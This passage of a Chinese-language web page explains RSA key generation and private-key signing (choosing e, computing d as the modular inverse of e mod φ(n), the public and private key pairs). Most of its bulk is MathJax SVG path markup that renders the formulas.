-205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(596,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(985,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1585,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>互质的整数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container>​（通常选择较小的素数，如65537）</p></li><li><p>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>使得<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.054ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 466 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g></g></svg></mjx-container>的模<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="4.466ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 1974 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(596,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(985,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1585,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>逆元，即满足：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.626ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8232.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mi" transform="translate(1298,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(2041.8,0)"><path data-c="2261" d="M56 444Q56 457 70 464H707Q722 456 722 444Q722 430 706 424H72Q56 429 56 444ZM56 237T56 250T70 270H707Q722 262 722 250T707 230H70Q56 237 56 250ZM56 56Q56 71 72 76H706Q722 70 722 56Q722 44 707 36H70Q56 43 56 56Z"></path></g><g data-mml-node="mn" transform="translate(3097.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3597.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3986.6,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4864.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5349.6,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(5869.6,0)"><path data-c="1D719" d="M409 688Q413 694 421 694H429H442Q448 688 448 686Q448 679 418 563Q411 535 404 504T392 458L388 442Q388 441 397 441T429 435T477 418Q521 397 550 357T579 260T548 151T471 65T374 11T279 -10H275L251 -105Q245 -128 238 -160Q230 -192 227 -198T215 -205H209Q189 -205 189 -198Q189 -193 211 -103L234 -11Q234 -10 226 -10Q221 -10 206 -8T161 6T107 36T62 89T43 171Q43 231 76 284T157 370T254 422T342 441Q347 441 348 445L378 567Q409 686 409 688ZM122 150Q122 116 134 91T167 53T203 35T237 27H244L337 404Q333 404 326 403T297 395T255 379T211 350T170 304Q152 276 137 237Q122 191 122 150ZM500 282Q500 320 484 347T444 385T405 400T381 404H378L332 217L284 29Q284 27 285 27Q293 27 317 33T357 47Q400 66 431 100T475 170T494 234T500 282Z"></path></g><g data-mml-node="mo" transform="translate(6465.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(6854.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(7454.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7843.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container><br>这个方程可以通过扩展欧几里得算法求解。</p></li><li><p>公钥是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.178ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2288.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(989,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1433.7,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1899.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，私钥是<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.3ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 2342.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(989,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1433.7,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(1953.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>​​。</p></li><li><p><strong>私钥签名</strong>：给定消息 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.378ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 1051 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g></g></g></svg></mjx-container>（其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.378ex" height="1.545ex" role="img" focusable="false" viewBox="0 -683 1051 683"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g></g></g></svg></mjx-container>是一个整数，且<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.312ex;" xmlns="http://www.w3.org/2000/svg" width="10.901ex" height="1.857ex" role="img" focusable="false" viewBox="0 -683 4818.1 821"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(1833.6,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="mo" transform="translate(3162.3,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="mi" transform="translate(4218.1,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>），签名过程为：<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="16.779ex" height="2.61ex" role="img" focusable="false" viewBox="0 -903.7 7416.3 1153.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 